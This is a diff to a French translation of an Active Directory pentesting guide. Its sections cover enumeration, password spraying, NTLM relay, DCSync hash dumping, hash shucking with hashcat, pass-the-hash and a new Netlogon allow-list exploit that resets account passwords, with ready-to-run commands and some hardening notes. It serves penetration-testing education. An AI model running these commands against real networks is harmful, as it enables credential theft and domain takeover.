@@ -4,23 +4,23 @@
 
 ## Aperçu de base
 
-**Active Directory** sert de technologie fondamentale, permettant aux **network administrators** de créer et de gérer efficacement des **domains**, des **users** et des **objects** au sein d’un réseau. Il est conçu pour évoluer, facilitant l’organisation d’un grand nombre de users en **groups** et **subgroups** gérables, tout en contrôlant les **access rights** à différents niveaux.
+**Active Directory** sert de technologie fondamentale, permettant aux **administrateurs réseau** de créer et de gérer efficacement des **domains**, des **users** et des **objects** au sein d’un réseau. Il est conçu pour passer à grande échelle, facilitant l’organisation d’un grand nombre de users en **groups** et **subgroups** gérables, tout en contrôlant les **access rights** à différents niveaux.
 
-La structure de **Active Directory** se compose de trois couches principales : **domains**, **trees** et **forests**. Un **domain** englobe un ensemble d’objects, tels que des **users** ou des **devices**, partageant une base de données commune. Les **trees** sont des groupes de ces domains reliés par une structure partagée, et une **forest** représente l’ensemble de plusieurs trees, interconnectés par des **trust relationships**, formant la couche la plus élevée de la structure organisationnelle. Des **access** et **communication rights** spécifiques peuvent être définis à chacun de ces niveaux.
+La structure de **Active Directory** se compose de trois couches principales : **domains**, **trees** et **forests**. Un **domain** englobe un ensemble d’objects, tels que des **users** ou des **devices**, partageant une base de données commune. Les **trees** sont des groupes de ces domains liés par une structure partagée, et une **forest** représente la collection de plusieurs trees, interconnectés par des **trust relationships**, formant la couche la plus élevée de la structure organisationnelle. Des **access** et **communication rights** spécifiques peuvent être définis à chacun de ces niveaux.
 
-Les concepts clés de **Active Directory** incluent :
+Les concepts clés dans **Active Directory** incluent :
 
-1. **Directory** – Contient toutes les informations relatives aux objets Active Directory.
+1. **Directory** – Héberge toutes les informations relatives aux objects Active Directory.
 2. **Object** – Désigne des entités dans le directory, notamment des **users**, des **groups** ou des **shared folders**.
-3. **Domain** – Sert de conteneur pour les objets du directory, avec la possibilité pour plusieurs domains de coexister dans une **forest**, chacun conservant son propre ensemble d’objets.
-4. **Tree** – Un regroupement de domains partageant un root domain commun.
+3. **Domain** – Sert de conteneur pour les directory objects, avec la possibilité pour plusieurs domains de coexister au sein d’une **forest**, chacune conservant sa propre collection d’objects.
+4. **Tree** – Un regroupement de domains partageant un common root domain.
 5. **Forest** – Le sommet de la structure organisationnelle dans Active Directory, composé de plusieurs trees avec des **trust relationships** entre elles.
 
-**Active Directory Domain Services (AD DS)** regroupe un ensemble de services essentiels pour la gestion centralisée et la communication au sein d’un réseau. Ces services comprennent :
+**Active Directory Domain Services (AD DS)** englobe un ensemble de services essentiels à la gestion centralisée et à la communication au sein d’un réseau. Ces services comprennent :
 
-1. **Domain Services** – Centralise le stockage des données et gère les interactions entre les **users** et les **domains**, y compris les fonctions d’**authentication** et de **search**.
+1. **Domain Services** – Centralise le stockage des données et gère les interactions entre **users** et **domains**, y compris les fonctions d’**authentication** et de **search**.
 2. **Certificate Services** – Supervise la création, la distribution et la gestion de **digital certificates** sécurisés.
-3. **Lightweight Directory Services** – Prend en charge les applications compatibles avec le directory via le **LDAP protocol**.
+3. **Lightweight Directory Services** – Prend en charge les applications compatibles directory via le **LDAP protocol**.
 4. **Directory Federation Services** – Fournit des capacités de **single-sign-on** pour authentifier les users sur plusieurs applications web au cours d’une seule session.
 5. **Rights Management** – Aide à protéger les contenus soumis au copyright en régulant leur distribution et leur utilisation non autorisées.
 6. **DNS Service** – Crucial pour la résolution des **domain names**.
@@ -37,22 +37,22 @@ Pour apprendre comment **attack an AD**, vous devez **understand** très bien le
 Vous pouvez consulter [https://wadcoms.github.io/](https://wadcoms.github.io) pour avoir un aperçu rapide des commandes que vous pouvez exécuter pour énumérer/exploiter un AD.
 
 > [!WARNING]
-> La communication Kerberos **requires a full qualifid name (FQDN)** pour effectuer des actions. Si vous essayez d’accéder à une machine via son adresse IP, **it'll use NTLM and not kerberos**.
+> La communication Kerberos **requires a full qualifid name (FQDN)** pour exécuter des actions. Si vous essayez d’accéder à une machine par son adresse IP, **it'll use NTLM and not kerberos**.
 
 ## Recon Active Directory (No creds/sessions)
 
-Si vous avez seulement accès à un environnement AD mais que vous n’avez aucune credentials/session, vous pourriez :
+Si vous avez seulement accès à un environnement AD mais que vous n’avez aucune creds/session, vous pourriez :
 
 - **Pentest the network:**
-- Scanner le réseau, trouver les machines et les ports ouverts, puis essayer d’**exploit vulnerabilities** ou d’**extract credentials** à partir d’eux (par exemple, [les printers peuvent être des cibles très intéressantes](ad-information-in-printers.md).
-- L’énumération DNS peut donner des informations sur les serveurs clés du domaine, comme les serveurs web, printers, shares, vpn, media, etc.
+- Scanner le réseau, trouver les machines et les ports ouverts, puis essayer d’**exploit vulnerabilities** ou d’**extract credentials** à partir d’elles (par exemple, les [printers could be very interesting targets](ad-information-in-printers.md).
+- L’énumération DNS peut fournir des informations sur les serveurs clés du domain comme web, printers, shares, vpn, media, etc.
 - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
-- Consultez la [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) générale pour obtenir plus d’informations sur la manière de procéder.
+- Consultez la page générale [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) pour plus d’informations sur la manière de procéder.
 - **Check for null and Guest access on smb services** (cela ne fonctionnera pas sur les versions modernes de Windows) :
 - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
 - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
 - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
-- Un guide plus détaillé sur la manière d’énumérer un serveur SMB se trouve ici :
+- Un guide plus détaillé sur l’énumération d’un serveur SMB peut être trouvé ici :
 
 
 {{#ref}}
@@ -61,7 +61,7 @@ Si vous avez seulement accès à un environnement AD mais que vous n’avez aucu
 
 - **Enumerate Ldap**
 - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
-- Un guide plus détaillé sur la manière d’énumérer LDAP se trouve ici (accordez une **attention particulière à l’accès anonyme**) :
+- Un guide plus détaillé sur l’énumération de LDAP peut être trouvé ici (prêtez **special attention to the anonymous access**) :
 
 
 {{#ref}}
@@ -71,9 +71,9 @@ Si vous avez seulement accès à un environnement AD mais que vous n’avez aucu
 - **Poison the network**
 - Récupérer des credentials en [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
 - Accéder à l’hôte en [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
-- Récupérer des credentials en **exposing** des [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
+- Récupérer des credentials en **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
 - [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html) :
-- Extraire des usernames/names à partir de documents internes, de réseaux sociaux, de services (principalement web) dans les environnements du domaine, ainsi que des sources publiques.
+- Extraire des usernames/names à partir de documents internes, des réseaux sociaux, des services (principalement web) au sein des environnements du domain, ainsi qu’à partir des informations publiquement disponibles.
 - Si vous trouvez les noms complets des employés de l’entreprise, vous pouvez essayer différentes conventions de **username AD (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Les conventions les plus courantes sont : _NameSurname_, _Name.Surname_, _NamSur_ (3 lettres de chacun), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
 - Tools :
 - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
@@ -82,8 +82,8 @@ Si vous avez seulement accès à un environnement AD mais que vous n’avez aucu
 ### User enumeration
 
 - **Anonymous SMB/LDAP enum:** Consultez les pages [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) et [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
-- **Kerbrute enum**: Lorsqu’un **invalid username is requested**, le serveur répond avec le code d’erreur **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, ce qui permet de déterminer que le username est invalide. Les **Valid usernames** provoqueront soit le **TGT in a AS-REP** response, soit l’erreur _KRB5KDC_ERR_PREAUTH_REQUIRED_, indiquant que l’utilisateur doit effectuer une pré-authentication.
-- **No Authentication against MS-NRPC**: Utilisation du auth-level = 1 (No authentication) contre l’interface MS-NRPC (Netlogon) sur les domain controllers. La méthode appelle la fonction `DsrGetDcNameEx2` après liaison à l’interface MS-NRPC afin de vérifier si l’utilisateur ou l’ordinateur existe sans aucune credentials. L’outil [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implémente ce type d’énumération. La recherche peut être consultée [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
+- **Kerbrute enum** : Lorsqu’un **invalid username is requested**, le server répondra avec le code d’erreur **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, ce qui nous permet de déterminer que le username était invalide. Les **valid usernames** provoqueront soit la réponse **TGT in a AS-REP**, soit l’erreur _KRB5KDC_ERR_PREAUTH_REQUIRED_, indiquant que l’utilisateur doit effectuer une pré-authentication.
+- **No Authentication against MS-NRPC** : En utilisant auth-level = 1 (No authentication) contre l’interface MS-NRPC (Netlogon) sur les domain controllers. La méthode appelle la fonction `DsrGetDcNameEx2` après avoir lié l’interface MS-NRPC pour vérifier si l’utilisateur ou l’ordinateur existe sans aucune credential. L’outil [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implémente ce type d’énumération. La recherche peut être trouvée [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
 ```bash
 ./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases
 
@@ -95,9 +95,9 @@ msf> use auxiliary/gather/kerberos_enumusers
 crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
 python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
 ```
-- **OWA (Outlook Web Access) Server**
+- **Serveur OWA (Outlook Web Access)**
 
-Si vous avez trouvé un de ces serveurs dans le réseau, vous pouvez aussi effectuer une **énumération d’utilisateurs** contre lui. Par exemple, vous pouvez utiliser l’outil [**MailSniper**](https://github.com/dafthack/MailSniper):
+Si vous avez trouvé l’un de ces serveurs sur le réseau, vous pouvez également effectuer une **énumération des utilisateurs** contre lui. Par exemple, vous pourriez utiliser l’outil [**MailSniper**](https://github.com/dafthack/MailSniper):
 ```bash
 ipmo C:\Tools\MailSniper\MailSniper.ps1
 # Get info about the domain
@@ -110,17 +110,55 @@ Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summe
 Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
 ```
 > [!WARNING]
-> Vous pouvez trouver des listes de noms d'utilisateur dans [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  et dans celui-ci ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
+> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
 >
-> However, vous devriez avoir le **nom des personnes travaillant dans l'entreprise** à partir de l'étape de recon que vous auriez dû effectuer avant cela. Avec le nom et le prénom, vous pourriez utiliser le script [**namemash.py**](https://gist.github.com/superkojiman/11076951) pour générer des noms d'utilisateur potentiellement valides.
+> However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.
 
-### Knowing one or several usernames
+### Abus de la allow-list du canal vulnérable Netlogon (Onelogon)
 
-Ok, donc vous savez déjà que vous avez un nom d'utilisateur valide mais aucun mot de passe... Alors essayez :
+Même après que **Zerologon** est corrigé sur le DC, les comptes explicitement allow-listed peuvent encore être exposés au comportement **legacy/vulnerable Netlogon secure-channel**. La configuration risquée est la GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** ou la valeur de registre correspondante **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.
 
-- [**ASREPRoast**](asreproast.md) : Si un utilisateur **n'a pas** l'attribut _DONT_REQ_PREAUTH_, vous pouvez **demander un message AS_REP** pour cet utilisateur qui contiendra certaines données chiffrées par une dérivation du mot de passe de l'utilisateur.
-- [**Password Spraying**](password-spraying.md) : Essayons les mots de passe les plus **courants** avec chacun des utilisateurs découverts, peut-être qu'un utilisateur utilise un mauvais mot de passe (gardez à l'esprit la politique de mot de passe !).
-- Note that you can also **spray OWA servers** to try to get access to the users mail servers.
+Cette valeur est un **descripteur de sécurité SDDL** (voir [Security Descriptors](security-descriptors.md)). Tout compte ou groupe auquel l’ACE pertinente est accordée dans le DACL peut être ciblé. Par exemple, `O:BAG:BAD:(A;;RC;;;WD)` allow-list efficacement **Everyone**.
+
+Flux de travail pratique pour l’opérateur :
+
+1. **Identifier les principaux allow-listed** en vérifiant à la fois **SYSVOL/GPO** et le **registre du DC en live**.
+2. **Résoudre les SIDs** trouvés dans le SDDL en véritables utilisateurs/ordinateurs AD et prioriser les **comptes machine DC**, les **comptes de trust**, et autres machines privilégiées.
+3. Tenter de manière répétée une **authentification MS-NRPC / Netlogon** en tant que compte allow-listed.
+4. Après une guess réussie, abuser du **Netlogon password-setting** pour réinitialiser le mot de passe du compte cible (le PoC public le définit sur une chaîne vide).
+
+Exemples rapides de triage / lab à partir de l’artifact public :
+```bash
+# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
+poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>
+
+# Meet-in-the-middle attack against an allow-listed account
+poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'
+
+# Faster 24-bit brute force when you control another computer account
+poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
+--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
+```
+Notes:
+
+- Le **scanner** est utile car la allow-list effective peut exister dans **SYSVOL**, dans le **registry**, ou dans les deux.
+- Le chemin d’exploitation lui-même est important car il **ne nécessite pas de privilèges Domain Admin** une fois qu’un compte vulnérable a été identifié.
+- Compromettre un **compte machine de Domain Controller** comme `DC$` est particulièrement dangereux car la réinitialisation de ce mot de passe peut directement ouvrir des chemins plus larges de **AD takeover**.
+- La faisabilité du **brute-force** dépend du mode : l’artéfact public décrit une approche meet-in-the-middle, un brute force **24-bit** lorsqu’un autre compte machine est disponible, et des variantes **32-bit** plus lentes.
+
+Notes de détection / durcissement :
+
+- Auditez la politique de allow-list et supprimez tout sauf les exceptions de compatibilité temporaires et explicitement requises.
+- Surveillez les événements **System** du DC **5827/5828/5829/5830/5831** pour détecter les connexions Netlogon vulnérables refusées, découvertes ou explicitement autorisées par la politique.
+- Traitez les comptes dans `VulnerableChannelAllowList` comme **high-risk** jusqu’à ce que la dépendance legacy soit supprimée.
+
+### Connaître un ou plusieurs usernames
+
+Ok, donc vous savez déjà que vous avez un username valide mais aucun mot de passe... Alors essayez :
+
+- [**ASREPRoast**](asreproast.md) : Si un user **n’a pas** l’attribut _DONT_REQ_PREAUTH_, vous pouvez **request un message AS_REP** pour cet user qui contiendra des données chiffrées par une dérivation du mot de passe de l’utilisateur.
+- [**Password Spraying**](password-spraying.md) : Essayons les mots de passe les plus **common** avec chacun des users découverts, peut-être qu’un user utilise un mauvais mot de passe (gardez à l’esprit la password policy !).
+- Notez que vous pouvez aussi **spray des serveurs OWA** pour essayer d’obtenir un accès aux serveurs mail des users.
 
 
 {{#ref}}
@@ -129,7 +167,7 @@ password-spraying.md
 
 ### LLMNR/NBT-NS Poisoning
 
-Vous pourriez être en mesure d'**obtenir** des **hashes** de challenge à craquer en **poisoning** certains protocoles du **network** :
+Vous pourriez être en mesure d’**obtenir** des challenge **hashes** à crack en **poisoning** certains protocoles du **network** :
 
 
 {{#ref}}
@@ -138,22 +176,22 @@ Vous pourriez être en mesure d'**obtenir** des **hashes** de challenge à craqu
 
 ### NTLM Relay
 
-Si vous avez réussi à énumérer active directory, vous aurez **plus d'emails et une meilleure compréhension du réseau**. Vous pourriez être en mesure de forcer des **relay attacks** NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  pour obtenir l'accès à l'environnement AD.
+Si vous avez réussi à énumérer l’active directory, vous aurez **plus d’emails et une meilleure compréhension du network**. Vous pourriez être en mesure de forcer des **relay attacks** NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) pour obtenir l’accès à l’environnement AD.
 
 ### NetExec workspace-driven recon & relay posture checks
 
-- Utilisez les **workspaces `nxcdb`** pour conserver l'état de la recon AD par mission : `workspace create <name>` crée des bases de données SQLite par protocole sous `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Changez de vue avec `proto smb|mssql|winrm` et listez les secrets récupérés avec `creds`. Supprimez manuellement les données sensibles une fois terminé : `rm -rf ~/.nxc/workspaces/<name>`.
-- La découverte rapide du sous-réseau avec **`netexec smb <cidr>`** remonte le **domaine**, la **build OS**, les **exigences de signature SMB** et le **Null Auth**. Les membres affichant `(signing:False)` sont **relay-prone**, tandis que les DC exigent souvent la signature.
-- Générez les **noms d'hôte dans /etc/hosts** directement à partir de la sortie NetExec pour faciliter le ciblage :
+- Utilisez les **`nxcdb` workspaces** pour conserver l’état de la recon AD par engagement : `workspace create <name>` lance des bases SQLite par protocole sous `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Basculez les vues avec `proto smb|mssql|winrm` et listez les secrets collectés avec `creds`. Supprimez manuellement les données sensibles une fois terminé : `rm -rf ~/.nxc/workspaces/<name>`.
+- La découverte rapide de sous-réseaux avec **`netexec smb <cidr>`** expose le **domain**, le **OS build**, les exigences de **SMB signing**, et le **Null Auth**. Les membres affichant `(signing:False)` sont **relay-prone**, tandis que les DC exigent souvent le signing.
+- Générez des **hostnames dans /etc/hosts** directement à partir de la sortie NetExec pour faciliter le ciblage :
 ```bash
 netexec smb 10.2.10.0/24 --generate-hosts-file hosts
 cat hosts /etc/hosts | sponge /etc/hosts
 ```
-- Lorsque le **SMB relay vers le DC est bloqué** par le signing, sonde quand même la posture **LDAP** : `netexec ldap <dc>` met en évidence `(signing:None)` / un weak channel binding. Un DC avec SMB signing requis mais LDAP signing désactivé reste une cible viable de **relay-to-LDAP** pour des abus comme **SPN-less RBCD**.
+- Lorsque le **SMB relay vers le DC est bloqué** par le signing, sondez quand même la posture **LDAP** : `netexec ldap <dc>` met en évidence `(signing:None)` / un channel binding faible. Un DC avec SMB signing requis mais LDAP signing désactivé reste une cible viable de **relay-to-LDAP** pour des abus comme **SPN-less RBCD**.
 
-### Fuites de credentials d’imprimante côté client → validation en masse des credentials de domaine
+### Fuites d’identifiants d’imprimante côté client → validation en masse des identifiants de domaine
 
-- Les interfaces web/imprimantes peuvent parfois **intégrer des mots de passe admin masqués dans le HTML**. Consulter le code source/devtools peut révéler le cleartext (par ex., `<input value="<password>">`), permettant un accès Basic-auth aux dépôts de scan/print.
+- Les interfaces web/d’imprimante **intègrent parfois des mots de passe admin masqués dans le HTML**. L’affichage du source/devtools peut révéler le clair (par ex., `<input value="<password>">`), ce qui permet un accès Basic-auth pour analyser les dépôts de scan/print.
 - Les travaux d’impression récupérés peuvent contenir des **docs d’onboarding en plaintext** avec des mots de passe par utilisateur. Gardez les appariements alignés lors des tests :
 ```bash
 cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
@@ -162,7 +200,7 @@ netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
 ```
 ### Steal NTLM Creds
 
-Si vous pouvez **accéder à d'autres PCs ou shares** avec l'utilisateur **null ou guest** vous pourriez **placer des fichiers** (comme un fichier SCF) qui, s'ils sont accédés, vont **déclencher une authentification NTLM contre vous** afin que vous puissiez **steal** le **NTLM challenge** pour le casser:
+If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:
 
 
 {{#ref}}
@@ -171,34 +209,34 @@ Si vous pouvez **accéder à d'autres PCs ou shares** avec l'utilisateur **null 
 
 ### Hash Shucking & NT-Candidate Attacks
 
-**Hash shucking** considère chaque NT hash que vous possédez déjà comme un mot de passe candidat pour d'autres formats, plus lents, dont le matériel de clé est dérivé directement du NT hash. Au lieu de brute-force de longues passphrases dans des tickets Kerberos RC4, des challenges NetNTLM, ou des identifiants mis en cache, vous alimentez Hashcat avec les NT hashes dans les modes NT-candidate et laissez l'outil valider la réutilisation de mot de passe sans jamais apprendre le plaintext. C'est particulièrement puissant après une compromission de domaine où vous pouvez collecter des milliers de NT hashes actuels et historiques.
+**Hash shucking** traite chaque NT hash que vous possédez déjà comme un mot de passe candidat pour d’autres formats, plus lents, dont le matériel de clé est dérivé directement du NT hash. Au lieu de brute-forcer de longues passphrases dans des tickets Kerberos RC4, des challenges NetNTLM, ou des identifiants mis en cache, vous alimentez Hashcat avec les NT hashes via les modes NT-candidate et vous le laissez valider la réutilisation de mot de passe sans jamais connaître le texte en clair. C’est particulièrement efficace après une compromission de domaine, où vous pouvez récolter des milliers de NT hashes actuels et historiques.
 
-Utilisez le shucking quand:
+Utilisez le shucking quand :
 
-- Vous avez un corpus NT issu de DCSync, de dumps SAM/SECURITY, ou de credential vaults et devez tester la réutilisation dans d'autres domaines/forests.
+- Vous avez un corpus NT issu de DCSync, de dumps SAM/SECURITY, ou de coffres d’identifiants, et devez tester la réutilisation dans d’autres domaines/forests.
 - Vous capturez du matériel Kerberos basé sur RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), des réponses NetNTLM, ou des blobs DCC/DCC2.
-- Vous voulez prouver rapidement la réutilisation de longues passphrases impossibles à casser et pivoter immédiatement via Pass-the-Hash.
+- Vous voulez prouver rapidement la réutilisation pour de longues passphrases impossibles à crack et pivoter immédiatement via Pass-the-Hash.
 
 La technique **ne fonctionne pas** contre les types de chiffrement dont les clés ne sont pas le NT hash (par ex., Kerberos etype 17/18 AES). Si un domaine impose AES-only, vous devez revenir aux modes de mot de passe classiques.
 
 #### Construire un corpus de NT hashes
 
-- **DCSync/NTDS** – Utilisez `secretsdump.py` avec l'historique pour récupérer le plus grand ensemble possible de NT hashes (et leurs valeurs précédentes) :
+- **DCSync/NTDS** – Utilisez `secretsdump.py` avec l’historique pour récupérer le plus grand ensemble possible de NT hashes (et leurs valeurs précédentes) :
 
 ```bash
 secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
 grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
 ```
 
-Les entrées d'historique élargissent énormément le pool de candidats, car Microsoft peut stocker jusqu'à 24 hashes précédents par compte. Pour plus de façons de collecter les secrets NTDS voir :
+Les entrées d’historique élargissent énormément le pool de candidats, car Microsoft peut stocker jusqu’à 24 hashes précédents par compte. Pour d’autres moyens de récolter les secrets NTDS, voir :
 
 {{#ref}}
 dcsync.md
 {{#endref}}
 
-- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ou Mimikatz `lsadump::sam /patch`) extrait les données locales SAM/SECURITY et les logons de domaine mis en cache (DCC/DCC2). Dédupliquez et ajoutez ces hashes à la même liste `nt_candidates.txt`.
-- **Suivre les métadonnées** – Conservez le username/domain qui a produit chaque hash (même si la wordlist ne contient que des hex). Les hashes correspondants vous indiquent immédiatement quel principal réutilise un mot de passe une fois que Hashcat affiche le candidat gagnant.
-- Préférez les candidats du même forest ou d'un forest de confiance ; cela maximise les chances de recouvrement lors du shucking.
+- **Dumps du cache de l’endpoint** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ou Mimikatz `lsadump::sam /patch`) extrait les données locales SAM/SECURITY et les logons de domaine mis en cache (DCC/DCC2). Dédupliquez et ajoutez ces hashes à la même liste `nt_candidates.txt`.
+- **Suivre les métadonnées** – Conservez le nom d’utilisateur/domaine qui a produit chaque hash (même si la wordlist ne contient que de l’hexadécimal). Des hashes correspondants vous indiquent immédiatement quel principal réutilise un mot de passe une fois que Hashcat affiche le candidat gagnant.
+- Préférez les candidats issus du même forest ou d’un forest de confiance ; cela maximise les chances de recouvrement lors du shucking.
 
 #### Modes NT-candidate de Hashcat
 
@@ -212,16 +250,16 @@ dcsync.md
 | Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
 | Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |
 
-Notes:
+Notes :
 
-- Les entrées NT-candidate **doivent rester des NT hashes bruts en 32 hex**. Désactivez les rule engines (pas de `-r`, pas de modes hybrides) car les transformations corrompent le matériel de clé candidat.
-- Ces modes ne sont pas intrinsèquement plus rapides, mais l'espace de clés NTLM (~30,000 MH/s sur un M3 Max) est ~100× plus rapide que Kerberos RC4 (~300 MH/s). Tester une liste NT sélectionnée est bien moins coûteux que d'explorer tout l'espace de mots de passe dans le format lent.
-- Utilisez toujours la **dernière version de Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`) car les modes 31500/31600/35300/35400 sont apparus récemment.
-- Il n'existe actuellement aucun mode NT pour AS-REQ Pre-Auth, et les etypes AES (19600/19700) nécessitent le plaintext password parce que leurs clés sont dérivées via PBKDF2 à partir de mots de passe UTF-16LE, pas de NT hashes bruts.
+- Les entrées NT-candidate **doivent rester des NT hashes bruts en 32 hex**. Désactivez les rule engines (pas de `-r`, pas de modes hybrides) car toute transformation corrompt le matériel de clé candidat.
+- Ces modes ne sont pas intrinsèquement plus rapides, mais l’espace de clés NTLM (~30,000 MH/s sur un M3 Max) est ~100× plus rapide que Kerberos RC4 (~300 MH/s). Tester une liste NT sélectionnée coûte bien moins cher que d’explorer tout l’espace des mots de passe dans le format lent.
+- Utilisez toujours la **dernière version de Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`) car les modes 31500/31600/35300/35400 sont récents.
+- Il n’existe actuellement pas de mode NT pour AS-REQ Pre-Auth, et les etypes AES (19600/19700) nécessitent le mot de passe en clair car leurs clés sont dérivées via PBKDF2 à partir de mots de passe UTF-16LE, et non de NT hashes bruts.
 
 #### Exemple – Kerberoast RC4 (mode 35300)
 
-1. Capturez un TGS RC4 pour un SPN cible avec un utilisateur à faible privilège (voir la page Kerberoast pour plus de détails) :
+1. Capturez un TGS RC4 pour un SPN cible avec un utilisateur à faible privilège (voir la page Kerberoast pour les détails) :
 
 {{#ref}}
 kerberoast.md
@@ -237,7 +275,7 @@ GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
 hashcat -m 35300 roastable_TGS nt_candidates.txt
 ```
 
-Hashcat dérive la clé RC4 à partir de chaque NT candidate et valide le blob `$krb5tgs$23$...`. Une correspondance confirme que le compte de service utilise l'un de vos NT hashes existants.
+Hashcat dérive la clé RC4 à partir de chaque candidat NT et valide le blob `$krb5tgs$23$...`. Une correspondance confirme que le compte de service utilise l’un de vos NT hashes existants.
 
 3. Pivotez immédiatement via PtH :
 
@@ -245,33 +283,33 @@ Hashcat dérive la clé RC4 à partir de chaque NT candidate et valide le blob `
 nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
 ```
 
-Vous pouvez éventuellement récupérer le plaintext plus tard avec `hashcat -m 1000 <matched_hash> wordlists/` si nécessaire.
+Vous pouvez éventuellement récupérer le texte en clair plus tard avec `hashcat -m 1000 <matched_hash> wordlists/` si nécessaire.
 
 #### Exemple – Identifiants mis en cache (mode 31600)
 
-1. Déversez les logons mis en cache depuis une workstation compromise :
+1. Extrayez les logons mis en cache depuis une machine compromise :
 
 ```bash
 nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
 ```
 
-2. Copiez la ligne DCC2 pour l'utilisateur de domaine intéressant dans `dcc2_highpriv.txt` et shuckez-la :
+2. Copiez la ligne DCC2 pour l’utilisateur de domaine intéressant dans `dcc2_highpriv.txt` et shuckez-la :
 
 ```bash
 hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
 ```
 
-3. Une correspondance réussie produit le NT hash déjà connu dans votre liste, prouvant que l'utilisateur mis en cache réutilise un mot de passe. Utilisez-le directement pour PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ou brute-forcez-le en mode NTLM rapide pour retrouver la chaîne.
+3. Une correspondance réussie fournit le NT hash déjà connu dans votre liste, prouvant que l’utilisateur mis en cache réutilise un mot de passe. Utilisez-le directement pour PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ou brute-forcez-le en mode NTLM rapide pour retrouver la chaîne.
 
